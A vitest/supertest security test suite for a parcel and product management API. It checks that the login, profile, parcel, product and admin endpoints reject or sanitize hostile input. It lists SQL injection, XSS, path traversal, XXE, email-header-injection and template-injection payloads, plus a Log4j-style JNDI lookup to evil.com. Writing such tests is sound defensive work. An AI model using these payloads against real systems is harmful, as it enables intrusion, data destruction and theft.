import { describe, test, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest'
import supertest from 'supertest'
import {
    setupTestServer,
    teardownTestServer,
    setupTestDatabase,
    teardownTestDatabase,
    cleanupTestDatabase,
    createApiClient
} from './setup'
import { createAuthHelpers, ApiAuthHelpers } from './auth-helpers'

describe('Security Vulnerability Tests - Direct API', () => {
    let apiClient: supertest.SuperTest<supertest.Test>
    let testDb: any
    let authHelpers: ApiAuthHelpers

    beforeAll(async () => {
        await setupTestServer()
        testDb = await setupTestDatabase()
        apiClient = createApiClient()
        authHelpers = createAuthHelpers(apiClient, testDb)
    })

    afterAll(async () => {
        await teardownTestDatabase()
        await teardownTestServer()
    })

    beforeEach(async () => {
        await cleanupTestDatabase()
    })

    afterEach(async () => {
        await authHelpers.cleanupTestUsers()
    })

    describe('SQL Injection Prevention Tests', () => {
        test('should prevent SQL injection in login endpoint', async () => {
            const sqlInjectionPayloads = [
                "'; DROP TABLE users; --",
                "admin'; UPDATE users SET password = 'hacked'; --",
                "' OR '1'='1'; --",
                "' UNION SELECT * FROM users; --",
                "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
                "' OR 1=1 LIMIT 1; --",
                "admin'/**/OR/**/1=1#",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM users) > 0; --"
            ]

            for (const payload of sqlInjectionPayloads) {
                const response = await apiClient
                    .post('/api/v1/auth/login')
                    .send({
                        identifier: payload,
                        password: 'password123'
                    })

                // Should not crash and should return appropriate error
                expect(response.status).toBeGreaterThanOrEqual(400)
                expect(response.body.success).toBe(false)

                // Verify database is still intact
                const userCount = testDb.prepare('SELECT COUNT(*) as count FROM users').get()
                expect(userCount).toBeDefined()
                expect(typeof userCount.count).toBe('number')
            }
        })

        test('should prevent SQL injection in parcelles endpoints', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const sqlPayloads = [
                "'; DROP TABLE parcelles; --",
                "' OR 1=1; --",
                "'; UPDATE parcelles SET prix_achat = 0; --",
                "' UNION SELECT * FROM users; --"
            ]

            for (const payload of sqlPayloads) {
                // Test GET with malicious query parameter
                const getResponse = await apiClient
                    .get(`/api/v1/parcelles?search=${encodeURIComponent(payload)}`)
                    .set('Cookie', `session_id=${session.id}`)

                expect([200, 400, 500]).toContain(getResponse.status)

                // Test POST with malicious data
                const postResponse = await apiClient
                    .post('/api/v1/parcelles')
                    .set('Cookie', `session_id=${session.id}`)
                    .send({
                        numero: payload,
                        transporteur: 'DHL',
                        poids: 1.5,
                        prix_achat: 25.50
                    })

                expect(postResponse.status).toBeGreaterThanOrEqual(400)

                // Verify database integrity
                const parcelleCount = testDb.prepare('SELECT COUNT(*) as count FROM parcelles').get()
                expect(parcelleCount).toBeDefined()
            }
        })

        test('should prevent SQL injection in products endpoints', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)
            const testParcelle = await authHelpers.createTestParcelle(testUser.id)

            const sqlPayloads = [
                "'; DROP TABLE products; --",
                "' OR 1=1; DELETE FROM products; --",
                "'; UPDATE products SET prix = 0; --"
            ]

            for (const payload of sqlPayloads) {
                const response = await apiClient
                    .post('/api/v1/produits')
                    .set('Cookie', `session_id=${session.id}`)
                    .send({
                        nom: payload,
                        prix: 15.99,
                        quantite: 1,
                        parcelle_id: testParcelle.id,
                        description: 'Test product'
                    })

                expect(response.status).toBeGreaterThanOrEqual(400)

                // Verify database integrity
                const productCount = testDb.prepare('SELECT COUNT(*) as count FROM products').get()
                expect(productCount).toBeDefined()
            }
        })

        test('should prevent SQL injection in search endpoints', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const sqlPayloads = [
                "'; DROP TABLE users; --",
                "' UNION SELECT password FROM users; --",
                "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --"
            ]

            for (const payload of sqlPayloads) {
                const response = await apiClient
                    .get(`/api/v1/search/global?q=${encodeURIComponent(payload)}`)
                    .set('Cookie', `session_id=${session.id}`)

                expect([200, 400, 500]).toContain(response.status)

                // Verify database integrity
                const userCount = testDb.prepare('SELECT COUNT(*) as count FROM users').get()
                expect(userCount).toBeDefined()
            }
        })

        test('should prevent SQL injection in profile update', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const sqlPayloads = [
                "'; DROP TABLE users; --",
                "admin'; UPDATE users SET role = 'admin'; --",
                "'; DELETE FROM sessions; --"
            ]

            for (const payload of sqlPayloads) {
                const response = await apiClient
                    .post('/api/v1/profile/update')
                    .set('Cookie', `session_id=${session.id}`)
                    .send({
                        username: payload,
                        email: 'test@example.com',
                        theme: 'light',
                        language: 'fr'
                    })

                // Should handle safely
                expect([200, 400, 500]).toContain(response.status)

                // Verify database integrity
                const userCount = testDb.prepare('SELECT COUNT(*) as count FROM users').get()
                expect(userCount).toBeDefined()

                const sessionCount = testDb.prepare('SELECT COUNT(*) as count FROM sessions').get()
                expect(sessionCount).toBeDefined()
            }
        })
    })

    describe('XSS Attack Prevention Tests', () => {
        test('should prevent XSS in login responses', async () => {
            const xssPayloads = [
                '<script>alert("xss")</script>',
                '<img src="x" onerror="alert(\'xss\')" />',
                '<svg onload="alert(\'xss\')" />',
                'javascript:alert("xss")',
                '<iframe src="javascript:alert(\'xss\')"></iframe>',
                '<body onload="alert(\'xss\')" />',
                '<div onclick="alert(\'xss\')">Click me</div>',
                '<input type="text" value="" onfocus="alert(\'xss\')" />',
                '<a href="javascript:alert(\'xss\')">Link</a>',
                '<style>body{background:url("javascript:alert(\'xss\')")}</style>'
            ]

            for (const payload of xssPayloads) {
                const response = await apiClient
                    .post('/api/v1/auth/login')
                    .send({
                        identifier: payload,
                        password: 'password123'
                    })

                expect(response.status).toBeGreaterThanOrEqual(400)
                expect(response.body.success).toBe(false)

                // Response should not contain unescaped script tags or event handlers
                const responseText = JSON.stringify(response.body)
                expect(responseText).not.toContain('<script>')
                expect(responseText).not.toContain('onerror')
                expect(responseText).not.toContain('onload')
                expect(responseText).not.toContain('onclick')
                expect(responseText).not.toContain('javascript:')
            }
        })

        test('should sanitize XSS in profile updates', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const xssPayloads = [
                '<script>alert("xss")</script>',
                '<img src="x" onerror="alert(\'xss\')" />',
                '<svg onload="alert(\'xss\')" />',
                'javascript:alert("xss")',
                '<iframe src="javascript:alert(\'xss\')"></iframe>'
            ]

            for (const payload of xssPayloads) {
                const response = await apiClient
                    .post('/api/v1/profile/update')
                    .set('Cookie', `session_id=${session.id}`)
                    .send({
                        username: `user_${Date.now()}`,
                        email: 'test@example.com',
                        bio: payload,
                        theme: 'light',
                        language: 'fr'
                    })

                if (response.status === 200) {
                    // If update succeeds, verify data is sanitized
                    const updatedUser = testDb.prepare('SELECT * FROM users WHERE id = ?').get(testUser.id)
                    expect(updatedUser.bio).not.toContain('<script>')
                    expect(updatedUser.bio).not.toContain('onerror')
                    expect(updatedUser.bio).not.toContain('onload')
                    expect(updatedUser.bio).not.toContain('javascript:')
                } else {
                    // If rejected, should be due to validation
                    expect(response.status).toBeGreaterThanOrEqual(400)
                    expect(response.body.success).toBe(false)
                }
            }
        })

        test('should prevent XSS in parcelle data', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const xssPayload = '<script>alert("xss")</script>'

            const response = await apiClient
                .post('/api/v1/parcelles')
                .set('Cookie', `session_id=${session.id}`)
                .send({
                    numero: `P${Date.now()}`,
                    transporteur: 'DHL',
                    poids: 1.5,
                    prix_achat: 25.50,
                    notes: xssPayload
                })

            if (response.status === 200 || response.status === 201) {
                // If creation succeeds, verify data is sanitized
                const parcelle = testDb.prepare('SELECT * FROM parcelles WHERE numero = ?').get(`P${Date.now()}`)
                if (parcelle) {
                    expect(parcelle.notes).not.toContain('<script>')
                }
            } else {
                // If rejected, should be due to validation
                expect(response.status).toBeGreaterThanOrEqual(400)
            }
        })

        test('should prevent XSS in product data', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)
            const testParcelle = await authHelpers.createTestParcelle(testUser.id)

            const xssPayload = '<img src="x" onerror="alert(\'xss\')" />'

            const response = await apiClient
                .post('/api/v1/produits')
                .set('Cookie', `session_id=${session.id}`)
                .send({
                    nom: 'Test Product',
                    prix: 15.99,
                    quantite: 1,
                    parcelle_id: testParcelle.id,
                    description: xssPayload
                })

            if (response.status === 200 || response.status === 201) {
                // If creation succeeds, verify data is sanitized
                const product = testDb.prepare('SELECT * FROM products WHERE nom = ?').get('Test Product')
                if (product) {
                    expect(product.description).not.toContain('onerror')
                    expect(product.description).not.toContain('<img')
                }
            } else {
                // If rejected, should be due to validation
                expect(response.status).toBeGreaterThanOrEqual(400)
            }
        })
    })

    describe('CSRF Protection Tests', () => {
        test('should validate origin header for sensitive operations', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            // Test profile update with suspicious origin
            const response = await apiClient
                .post('/api/v1/profile/update')
                .set('Cookie', `session_id=${session.id}`)
                .set('Origin', 'https://malicious-site.com')
                .set('Referer', 'https://malicious-site.com/attack')
                .send({
                    username: 'csrf-test',
                    email: 'csrf@example.com',
                    theme: 'light',
                    language: 'fr'
                })

            // Should either require CSRF token, validate origin, or handle gracefully
            expect([200, 403, 400]).toContain(response.status)
        })

        test('should validate referer header for state-changing operations', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            // Test parcelle creation with suspicious referer
            const response = await apiClient
                .post('/api/v1/parcelles')
                .set('Cookie', `session_id=${session.id}`)
                .set('Referer', 'https://evil-site.com/csrf-attack')
                .send({
                    numero: 'CSRF001',
                    transporteur: 'DHL',
                    poids: 1.5,
                    prix_achat: 25.50
                })

            // Should validate referer or require additional protection
            expect([200, 201, 403, 400]).toContain(response.status)
        })

        test('should protect against CSRF in product operations', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)
            const testParcelle = await authHelpers.createTestParcelle(testUser.id)

            // Test product creation from external origin
            const response = await apiClient
                .post('/api/v1/produits')
                .set('Cookie', `session_id=${session.id}`)
                .set('Origin', 'https://attacker.com')
                .send({
                    nom: 'CSRF Product',
                    prix: 99.99,
                    quantite: 1,
                    parcelle_id: testParcelle.id
                })

            // Should validate origin or require CSRF protection
            expect([200, 201, 403, 400]).toContain(response.status)
        })

        test('should protect against CSRF in deletion operations', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)
            const testParcelle = await authHelpers.createTestParcelle(testUser.id)

            // Test deletion from external origin
            const response = await apiClient
                .delete(`/api/v1/parcelles/${testParcelle.id}`)
                .set('Cookie', `session_id=${session.id}`)
                .set('Origin', 'https://malicious.com')
                .set('Referer', 'https://malicious.com/delete-all')

            // Should validate origin/referer for destructive operations
            expect([200, 204, 403, 400]).toContain(response.status)
        })
    })

    describe('Authentication Bypass Tests', () => {
        test('should prevent session token manipulation', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const manipulatedTokens = [
                session.id + 'extra',
                session.id.slice(0, -1) + 'x',
                session.id.replace(/[0-9]/g, '0'),
                'admin-session-' + session.id,
                session.id.split('').reverse().join(''),
                btoa(session.id), // Base64 encoded
                session.id.toUpperCase(),
                session.id + '; DROP TABLE sessions; --'
            ]

            for (const token of manipulatedTokens) {
                const response = await apiClient
                    .get('/api/v1/auth/me')
                    .set('Cookie', `session_id=${token}`)

                expect(response.status).toBe(401)
                expect(response.body.success).toBe(false)
            }
        })

        test('should prevent privilege escalation through session manipulation', async () => {
            const testUser = await authHelpers.createTestUser({ role: 'user' })
            const session = await authHelpers.createTestSession(testUser.id)

            // Try to access admin endpoints
            const adminEndpoints = [
                '/api/v1/admin/database/overview',
                '/api/v1/admin/system/health',
                '/api/v1/admin/users',
                '/api/v1/admin/maintenance'
            ]

            for (const endpoint of adminEndpoints) {
                const response = await apiClient
                    .get(endpoint)
                    .set('Cookie', `session_id=${session.id}`)

                // Should deny access to admin endpoints
                expect([401, 403, 404]).toContain(response.status)
            }
        })

        test('should prevent authentication bypass with malformed headers', async () => {
            const malformedHeaders = [
                { 'Authorization': 'Bearer admin' },
                { 'Authorization': 'Basic YWRtaW46cGFzc3dvcmQ=' }, // admin:password
                { 'X-User-Id': 'admin' },
                { 'X-Admin': 'true' },
                { 'Cookie': 'admin=true; session_id=admin-session' },
                { 'Cookie': 'role=admin; user_id=1' }
            ]

            for (const headers of malformedHeaders) {
                const response = await apiClient
                    .get('/api/v1/auth/me')
                    .set(headers)

                expect(response.status).toBe(401)
                expect(response.body.success).toBe(false)
            }
        })

        test('should prevent JWT token manipulation if used', async () => {
            // Test various JWT manipulation attempts
            const fakeJWTs = [
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
                'admin.token.here',
                'Bearer admin-token'
            ]

            for (const token of fakeJWTs) {
                const response = await apiClient
                    .get('/api/v1/auth/me')
                    .set('Authorization', `Bearer ${token}`)

                expect(response.status).toBe(401)
                expect(response.body.success).toBe(false)
            }
        })
    })

    describe('Authorization Boundary Tests', () => {
        test('should enforce user data isolation', async () => {
            const user1 = await authHelpers.createTestUser({ email: 'user1@example.com' })
            const user2 = await authHelpers.createTestUser({ email: 'user2@example.com' })
            
            const session1 = await authHelpers.createTestSession(user1.id)
            const session2 = await authHelpers.createTestSession(user2.id)
            
            const parcelle1 = await authHelpers.createTestParcelle(user1.id)
            const parcelle2 = await authHelpers.createTestParcelle(user2.id)

            // User1 should not access User2's parcelles
            const response1 = await apiClient
                .get(`/api/v1/parcelles/${parcelle2.id}`)
                .set('Cookie', `session_id=${session1.id}`)

            expect([403, 404]).toContain(response1.status)

            // User2 should not access User1's parcelles
            const response2 = await apiClient
                .get(`/api/v1/parcelles/${parcelle1.id}`)
                .set('Cookie', `session_id=${session2.id}`)

            expect([403, 404]).toContain(response2.status)
        })

        test('should prevent unauthorized data modification', async () => {
            const user1 = await authHelpers.createTestUser({ email: 'user1@example.com' })
            const user2 = await authHelpers.createTestUser({ email: 'user2@example.com' })
            
            const session1 = await authHelpers.createTestSession(user1.id)
            const parcelle2 = await authHelpers.createTestParcelle(user2.id)

            // User1 should not modify User2's parcelle
            const response = await apiClient
                .put(`/api/v1/parcelles/${parcelle2.id}`)
                .set('Cookie', `session_id=${session1.id}`)
                .send({
                    numero: 'HACKED',
                    transporteur: 'HACKER',
                    poids: 999,
                    prix_achat: 0
                })

            expect([403, 404]).toContain(response.status)

            // Verify parcelle was not modified
            const originalParcelle = testDb.prepare('SELECT * FROM parcelles WHERE id = ?').get(parcelle2.id)
            expect(originalParcelle.numero).not.toBe('HACKED')
        })

        test('should prevent unauthorized data deletion', async () => {
            const user1 = await authHelpers.createTestUser({ email: 'user1@example.com' })
            const user2 = await authHelpers.createTestUser({ email: 'user2@example.com' })
            
            const session1 = await authHelpers.createTestSession(user1.id)
            const parcelle2 = await authHelpers.createTestParcelle(user2.id)

            // User1 should not delete User2's parcelle
            const response = await apiClient
                .delete(`/api/v1/parcelles/${parcelle2.id}`)
                .set('Cookie', `session_id=${session1.id}`)

            expect([403, 404]).toContain(response.status)

            // Verify parcelle still exists
            const parcelle = testDb.prepare('SELECT * FROM parcelles WHERE id = ?').get(parcelle2.id)
            expect(parcelle).toBeDefined()
        })

        test('should enforce role-based access control', async () => {
            const regularUser = await authHelpers.createTestUser({ role: 'user' })
            const adminUser = await authHelpers.createTestUser({ role: 'admin', email: 'admin2@example.com' })
            
            const userSession = await authHelpers.createTestSession(regularUser.id)
            const adminSession = await authHelpers.createTestSession(adminUser.id)

            // Regular user should not access admin endpoints
            const userResponse = await apiClient
                .get('/api/v1/admin/database/overview')
                .set('Cookie', `session_id=${userSession.id}`)

            expect([401, 403]).toContain(userResponse.status)

            // Admin should access admin endpoints
            const adminResponse = await apiClient
                .get('/api/v1/admin/database/overview')
                .set('Cookie', `session_id=${adminSession.id}`)

            expect([200, 404]).toContain(adminResponse.status) // 404 if endpoint doesn't exist yet
        })

        test('should prevent horizontal privilege escalation', async () => {
            const user1 = await authHelpers.createTestUser({ email: 'user1@example.com' })
            const user2 = await authHelpers.createTestUser({ email: 'user2@example.com' })
            
            const session1 = await authHelpers.createTestSession(user1.id)

            // User1 should not be able to update User2's profile
            const response = await apiClient
                .post('/api/v1/profile/update')
                .set('Cookie', `session_id=${session1.id}`)
                .set('X-Target-User', user2.id) // Attempt to target different user
                .send({
                    username: 'hacked-user2',
                    email: 'hacked@example.com',
                    theme: 'light',
                    language: 'fr'
                })

            // Should only update own profile
            if (response.status === 200) {
                const updatedUser1 = testDb.prepare('SELECT * FROM users WHERE id = ?').get(user1.id)
                const updatedUser2 = testDb.prepare('SELECT * FROM users WHERE id = ?').get(user2.id)
                
                // User2 should remain unchanged
                expect(updatedUser2.username).not.toBe('hacked-user2')
                expect(updatedUser2.email).not.toBe('hacked@example.com')
            }
        })
    })

    describe('Input Validation and Sanitization Tests', () => {
        test('should validate and sanitize file upload inputs', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const maliciousFileInputs = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '<script>alert("xss")</script>.jpg',
                'file.php%00.jpg',
                'file.exe',
                'file.bat',
                'file.sh',
                'file.jsp'
            ]

            for (const filename of maliciousFileInputs) {
                const response = await apiClient
                    .post('/api/v1/profile/update')
                    .set('Cookie', `session_id=${session.id}`)
                    .send({
                        username: testUser.username,
                        email: testUser.email,
                        avatar: `https://example.com/${filename}`,
                        theme: 'light',
                        language: 'fr'
                    })

                // Should validate file extensions and paths
                if (response.status === 200) {
                    const updatedUser = testDb.prepare('SELECT * FROM users WHERE id = ?').get(testUser.id)
                    expect(updatedUser.avatar).not.toContain('../')
                    expect(updatedUser.avatar).not.toContain('..\\')
                    expect(updatedUser.avatar).not.toContain('<script>')
                }
            }
        })

        test('should validate numeric inputs for boundary conditions', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const maliciousNumericInputs = [
                { poids: -999999, prix_achat: -999999 },
                { poids: Number.MAX_VALUE, prix_achat: Number.MAX_VALUE },
                { poids: Number.MIN_VALUE, prix_achat: Number.MIN_VALUE },
                { poids: Infinity, prix_achat: Infinity },
                { poids: -Infinity, prix_achat: -Infinity },
                { poids: NaN, prix_achat: NaN },
                { poids: 'DROP TABLE', prix_achat: 'DELETE FROM' },
                { poids: '<script>', prix_achat: 'javascript:' }
            ]

            for (const input of maliciousNumericInputs) {
                const response = await apiClient
                    .post('/api/v1/parcelles')
                    .set('Cookie', `session_id=${session.id}`)
                    .send({
                        numero: `P${Date.now()}`,
                        transporteur: 'DHL',
                        poids: input.poids,
                        prix_achat: input.prix_achat
                    })

                // Should validate numeric inputs
                expect(response.status).toBeGreaterThanOrEqual(400)
                expect(response.body.success).toBe(false)
            }
        })

        test('should validate email format and prevent email injection', async () => {
            const maliciousEmails = [
                'test@example.com\r\nBcc: hacker@evil.com',
                'test@example.com\nSubject: Hacked',
                'test@example.com%0d%0aBcc:hacker@evil.com',
                'test@example.com<script>alert("xss")</script>',
                'test@example.com"; DROP TABLE users; --',
                'test@example.com\x00admin@example.com',
                'test@example.com\r\nContent-Type: text/html'
            ]

            for (const email of maliciousEmails) {
                const response = await apiClient
                    .post('/api/v1/auth/login')
                    .send({
                        identifier: email,
                        password: 'password123'
                    })

                expect(response.status).toBeGreaterThanOrEqual(400)
                expect(response.body.success).toBe(false)
            }
        })

        test('should validate and sanitize text inputs for length and content', async () => {
            const testUser = await authHelpers.createTestUser()
            const session = await authHelpers.createTestSession(testUser.id)

            const maliciousTextInputs = [
                'A'.repeat(10000), // Extremely long input
                '\x00\x01\x02\x03\x04\x05', // Control characters
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '${jndi:ldap://evil.com/exploit}', // Log4j style injection
                '{{7*7}}', // Template injection
                '<%=7*7%>', // JSP injection
                '#{7*7}', // EL injection
            ]

            for (const input of maliciousTextInputs) {
                const response = await apiClient
                    .post('/api/v1/profile/update')
                    .set('Cookie', `session_id=${session.id}`)
                    .send({
                        username: testUser.username,
                        email: testUser.email,
                        bio: input,
                        theme: 'light',
                        language: 'fr'
                    })

                // Should validate and sanitize text inputs
                if (response.status === 200) {
                    const updatedUser = testDb.prepare('SELECT * FROM users WHERE id = ?').get(testUser.id)
                    expect(updatedUser.bio).not.toContain('<?xml')
                    expect(updatedUser.bio).not.toContain('${jndi:')
                    expect(updatedUser.bio).not.toContain('{{7*7}}')
                    expect(updatedUser.bio.length).toBeLessThanOrEqual(1000) // Reasonable length limit
                } else {
                    expect(response.status).toBeGreaterThanOrEqual(400)
                }
            }
        })
    })
})